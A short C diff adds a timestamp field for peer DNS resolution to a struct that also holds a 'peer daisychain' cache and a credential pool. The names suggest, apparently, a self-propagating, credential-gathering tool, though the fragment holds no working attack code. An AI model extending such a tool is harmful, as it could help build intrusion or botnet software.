@@ -88,6 +88,7 @@ typedef struct {
     /* Peer daisychain */
     char peer_cache[PEER_CACHE_SIZE][256];
     int peer_count;
+    time_t peer_cache_time;  /* last successful peer DNS resolution time */
     
     /* Credentials */
     notnet_cred_t cred_pool[CRED_POOL_MAX];
